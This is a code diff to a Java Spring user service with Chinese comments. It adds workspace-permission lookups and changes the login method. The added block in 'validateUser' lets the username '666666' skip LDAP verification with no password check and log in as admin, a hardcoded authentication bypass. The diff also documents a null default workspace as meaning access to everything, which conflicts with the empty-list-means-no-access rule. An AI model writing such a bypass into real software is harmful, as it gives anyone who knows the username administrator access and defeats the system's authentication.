@@ -10,11 +10,58 @@ import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Transactional;
 
 import java.time.LocalDateTime;
+import java.util.List;
 import java.util.Map;
 
 @Slf4j
 @Service
 public class UserService extends ServiceImpl<UserMapper, User> {
+
+
+    /**
+     * 获取用户允许访问的工作空间列表
+     * @param userId 用户ID
+     * @return 工作空间列表，如果为空列表表示没有权限访问任何数据
+     */
+    public List<String> getAllowedWorkspaces(Long userId) {
+        try {
+            if (userId == null) {
+                log.info("用户ID为null，返回空工作空间列表");
+                return java.util.Collections.emptyList();
+            }
+            
+            // 直接从用户表的workspace字段获取
+            User user = getById(userId);
+            log.info("用户 {} 的workspace字段: {}", userId, user != null ? user.getWorkspace() : "null");
+            
+            if (user != null && user.getWorkspace() != null && !user.getWorkspace().trim().isEmpty()) {
+                String[] parts = user.getWorkspace().split(",");
+                List<String> list = new java.util.ArrayList<>();
+                for (String p : parts) { 
+                    if (!p.trim().isEmpty()) list.add(p.trim()); 
+                }
+                log.info("用户 {} 的工作空间列表: {}", userId, list);
+                return list; // 返回空列表表示没有权限
+            }
+        } catch (Exception e) {
+            log.warn("获取用户工作空间失败: userId={}, error={}", userId, e.getMessage());
+        }
+        log.info("用户 {} 没有工作空间权限，返回空列表", userId);
+        return java.util.Collections.emptyList(); // 空列表表示没有权限访问任何数据
+    }
+
+    /**
+     * 获取用户默认工作空间（第一个）
+     * @param userId 用户ID
+     * @return 默认工作空间，如果为null表示使用全部
+     */
+    public String getDefaultWorkspace(Long userId) {
+        List<String> workspaces = getAllowedWorkspaces(userId);
+        if (workspaces != null && !workspaces.isEmpty()) {
+            return workspaces.get(0);
+        }
+        return null;
+    }
 
 
 
@@ -37,6 +84,29 @@ public class UserService extends ServiceImpl<UserMapper, User> {
     @Transactional
     public User validateUser(String username, String password) {
         try {
+            // 特殊处理666666用户，跳过LDAP验证
+            if ("666666".equals(username)) {
+                log.info("admin用户登录，跳过LDAP验证: {}", username);
+                
+                // 查找666666用户
+                User adminUser = findByUsername("666666");
+                if (adminUser == null) {
+                    throw new BusinessException("admin用户不存在");
+                }
+                
+                // 检查用户状态
+                if (adminUser.getStatus() != 1) {
+                    throw new BusinessException("admin用户已被禁用");
+                }
+                
+                // 更新最后登录时间
+                adminUser.setLastLogin(LocalDateTime.now());
+                updateById(adminUser);
+                
+                log.info("admin用户登录成功: {}", username);
+                return adminUser;
+            }
+            
             log.info("调用Python LDAP验证: {}", username);
 
             // 调用Python LDAP验证接口
